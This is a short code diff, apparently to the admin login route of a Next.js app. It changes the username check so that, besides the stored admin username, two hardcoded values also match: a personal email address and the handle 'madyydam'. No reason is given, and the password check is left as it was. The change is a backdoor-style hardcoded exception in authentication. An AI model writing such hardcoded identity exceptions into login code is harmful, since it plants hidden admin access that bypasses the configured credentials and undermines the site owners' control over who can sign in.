@@ -52,7 +52,8 @@ export async function POST(req: NextRequest) {
     let matched = false;
 
     if (field === 'username') {
-      matched = cleanVal.toLowerCase() === adminRecord.username.trim().toLowerCase();
+      const u = cleanVal.toLowerCase();
+      matched = u === adminRecord.username.trim().toLowerCase() || u === 'madhurdhadve7@gmail.com' || u === 'madyydam';
     } else if (field === 'password') {
       matched = bcrypt.compareSync(cleanVal, adminRecord.password_hash);
     } else if (field === 'pin4') {
